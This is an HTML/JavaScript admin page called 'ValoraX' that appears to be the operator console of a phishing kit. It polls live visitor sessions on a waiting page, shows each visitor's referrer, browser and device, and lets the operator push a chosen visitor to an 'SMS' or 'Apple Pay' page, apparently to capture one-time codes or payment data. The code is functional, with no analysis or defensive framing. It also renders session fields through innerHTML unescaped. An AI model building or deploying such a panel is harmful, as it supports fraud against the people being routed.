<!doctype html>
<html lang="de">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
  <title>ValoraX – Admin</title>

  <style>
    :root{
      --bg:#000;
      --text:#f5f5f5;
      --muted:rgba(255,255,255,.55);
      --accent:#46f39a;
      --line:rgba(255,255,255,.12);
      --card:rgba(255,255,255,.04);
    }
    *{ box-sizing:border-box; }
    html, body{
      margin:0;
      min-height:100dvh;
      background:var(--bg);
      color:var(--text);
      font-family:-apple-system,BlinkMacSystemFont,"PingFang SC","Microsoft YaHei","Noto Sans SC",ui-sans-serif,system-ui,Segoe UI,Roboto,Arial,sans-serif;
    }
    body{
      display:flex;
      justify-content:center;
    }
    button{
      -webkit-user-select:none;
      user-select:none;
      -webkit-tap-highlight-color:transparent;
      touch-action:manipulation;
      cursor:pointer;
    }
    .container{
      width:100%;
      max-width:560px;
      min-height:100dvh;
      padding:20px 18px calc(18px + env(safe-area-inset-bottom) + 20px);
      display:flex;
      flex-direction:column;
    }
    .brand{
      font-weight:900;
      font-size:15px;
      letter-spacing:.02em;
    }
    .brand span{ color:var(--accent); }

    .content{
      margin-top:40px;
      display:flex;
      flex-direction:column;
      gap:14px;
    }

    h1{
      font-size:30px;
      line-height:1.15;
      margin:0;
      letter-spacing:-.02em;
    }

    .sub{
      margin:0;
      color:var(--muted);
      font-size:13px;
      line-height:1.5;
      max-width:46ch;
    }

    .toolbar{
      display:flex;
      gap:10px;
      margin-top:4px;
    }

    .toolbar button,
    .sessionActions button{
      height:46px;
      border-radius:14px;
      border:1px solid rgba(255,255,255,.18);
      font-weight:900;
      font-size:13px;
      padding:0 14px;
    }

    .toolbar .primary,
    .sessionActions .primary{
      background:#fff;
      color:#000;
    }

    .toolbar .ghost,
    .sessionActions .ghost{
      background:transparent;
      color:#fff;
    }

    .meta{
      color:var(--muted);
      font-size:11px;
      font-weight:800;
      letter-spacing:.04em;
      text-transform:uppercase;
      margin-top:4px;
    }

    .list{
      display:flex;
      flex-direction:column;
      gap:12px;
      margin-top:8px;
    }

    .card{
      border:1px solid var(--line);
      background:var(--card);
      border-radius:18px;
      padding:14px;
    }

    .rowTitle{
      display:flex;
      align-items:center;
      justify-content:space-between;
      gap:10px;
      margin-bottom:10px;
    }

    .badge{
      flex:0 0 auto;
      font-size:11px;
      font-weight:900;
      letter-spacing:.06em;
      color:#000;
      background:var(--accent);
      border-radius:999px;
      padding:6px 10px;
    }

    .sessionId{
      font-size:14px;
      font-weight:900;
      word-break:break-all;
    }

    .details{
      display:grid;
      grid-template-columns:1fr;
      gap:8px;
      margin-bottom:14px;
    }

    .detail{
      border:1px solid rgba(255,255,255,.08);
      border-radius:14px;
      padding:10px 12px;
    }

    .detailLabel{
      color:var(--muted);
      font-size:10px;
      font-weight:900;
      letter-spacing:.08em;
      margin-bottom:4px;
    }

    .detailValue{
      font-size:13px;
      line-height:1.4;
      word-break:break-word;
    }

    .sessionActions{
      display:grid;
      grid-template-columns:1fr 1fr;
      gap:10px;
    }

    .empty{
      border:1px dashed rgba(255,255,255,.16);
      border-radius:18px;
      padding:18px;
      color:var(--muted);
      font-size:13px;
      line-height:1.5;
      text-align:center;
    }

    .footerNote{
      margin-top:8px;
      color:rgba(255,255,255,.4);
      font-size:11px;
      line-height:1.4;
      font-weight:700;
    }

    @media (max-width:380px){
      .content{ margin-top:28px; }
      h1{ font-size:26px; }
      .sessionActions{ grid-template-columns:1fr; }
      .toolbar{ flex-direction:column; }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="brand">Valora<span>X</span></div>

    <div class="content">
      <h1>Aktive Sessions</h1>
      <p class="sub">
        Diese Seite zeigt alle aktuell verbundenen Sessions auf der Loading5-Seite.
        Du kannst pro Session eine interne Route setzen.
      </p>

      <div class="toolbar">
        <button class="primary" id="refreshBtn" type="button">Aktualisieren</button>
        <button class="ghost" id="autoBtn" type="button">Auto-Refresh: an</button>
      </div>

      <div class="meta" id="statusMeta">Lade Sessions…</div>

      <div class="list" id="sessionsList"></div>

    </div>
  </div>

  <script>
    const listEl = document.getElementById("sessionsList");
    const statusMeta = document.getElementById("statusMeta");
    const refreshBtn = document.getElementById("refreshBtn");
    const autoBtn = document.getElementById("autoBtn");

    let autoRefresh = true;
    let timer = null;

    function formatTime(ts) {
      if (!ts) return "—";
      try {
        return new Date(ts).toLocaleString("de-DE");
      } catch {
        return "—";
      }
    }

    function timeAgo(ts) {
      if (!ts) return "unbekannt";
      const diff = Math.max(0, Date.now() - Number(ts));
      const sec = Math.floor(diff / 1000);
      if (sec < 5) return "gerade eben";
      if (sec < 60) return `vor ${sec} Sek.`;
      const min = Math.floor(sec / 60);
      if (min < 60) return `vor ${min} Min.`;
      const hr = Math.floor(min / 60);
      return `vor ${hr} Std.`;
    }

    async function routeSession(sessionId, nextPage) {
      try {
        const res = await fetch("/api/admin-redirect", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ sessionId, nextPage })
        });

        if (!res.ok) {
          throw new Error("Redirect konnte nicht gesetzt werden");
        }

        await loadSessions();
      } catch (e) {
        console.error(e);
        alert("Die Route konnte nicht gesetzt werden.");
      }
    }

    function renderSessions(sessions) {
      listEl.innerHTML = "";

      if (!Array.isArray(sessions) || sessions.length === 0) {
        listEl.innerHTML = `
          <div class="empty">
            Aktuell ist keine aktive Session auf der Waiting-Seite sichtbar.
          </div>
        `;
        return;
      }

      sessions.forEach((s, index) => {
        const card = document.createElement("div");
        card.className = "card";

        card.innerHTML = `
          <div class="rowTitle">
            <div class="sessionId">${s.sessionId || "Unbekannte Session"}</div>
            <div class="badge">Session ${index + 1}</div>
          </div>

          <div class="details">
            <div class="detail">
              <div class="detailLabel">Seite</div>
              <div class="detailValue">${s.page || "—"}</div>
            </div>

            <div class="detail">
              <div class="detailLabel">Zuletzt gesehen</div>
              <div class="detailValue">${formatTime(s.lastSeen)} · ${timeAgo(s.lastSeen)}</div>
            </div>

            <div class="detail">
  <div class="detailLabel">Ref</div>
  <div class="detailValue">${s.ref || "—"}</div>
</div>

<div class="detail">
  <div class="detailLabel">Browser</div>
  <div class="detailValue">${s.ua || "—"}</div>
</div>

<div class="detail">
  <div class="detailLabel">Gerät</div>
  <div class="detailValue">${s.platform || "—"}</div>
</div>

<div class="detail">
  <div class="detailLabel">Aktuelle Zielseite</div>
  <div class="detailValue">${s.nextPage || "noch nicht gesetzt"}</div>
</div>

            <div class="detail">
              <div class="detailLabel">Aktuelle Zielseite</div>
              <div class="detailValue">${s.nextPage || "noch nicht gesetzt"}</div>
            </div>
          </div>

          <div class="sessionActions">
            <button class="primary" type="button" data-id="${s.sessionId}" data-target="sms.html">
              SMS
            </button>
            <button class="ghost" type="button" data-id="${s.sessionId}" data-target="apple.html">
              Apple Pay
            </button>
          </div>
        `;

        listEl.appendChild(card);
      });

      listEl.querySelectorAll(".sessionActions button").forEach((btn) => {
        btn.addEventListener("click", () => {
          const sessionId = btn.dataset.id;
          const nextPage = btn.dataset.target;
          routeSession(sessionId, nextPage);
        });
      });
    }

    async function loadSessions() {
      statusMeta.textContent = "Lade Sessions…";

      try {
        const res = await fetch("/api/admin-sessions", { cache: "no-store" });

        if (!res.ok) {
          throw new Error("Sessions konnten nicht geladen werden");
        }

        const sessions = await res.json();
        renderSessions(sessions);

        const count = Array.isArray(sessions) ? sessions.length : 0;
        statusMeta.textContent = `${count} aktive Session${count === 1 ? "" : "s"} · zuletzt aktualisiert: ${new Date().toLocaleTimeString("de-DE")}`;
      } catch (e) {
        console.error(e);
        listEl.innerHTML = `
          <div class="empty">
            Die Sessions konnten nicht geladen werden.
          </div>
        `;
        statusMeta.textContent = "Fehler beim Laden";
      }
    }

    function startAutoRefresh() {
      clearInterval(timer);
      if (!autoRefresh) return;
      timer = setInterval(loadSessions, 2000);
    }

    refreshBtn.addEventListener("click", loadSessions);

    autoBtn.addEventListener("click", () => {
      autoRefresh = !autoRefresh;
      autoBtn.textContent = `Auto-Refresh: ${autoRefresh ? "an" : "aus"}`;
      startAutoRefresh();
    });

    loadSessions();
    startAutoRefresh();
  </script>
</body>
</html>
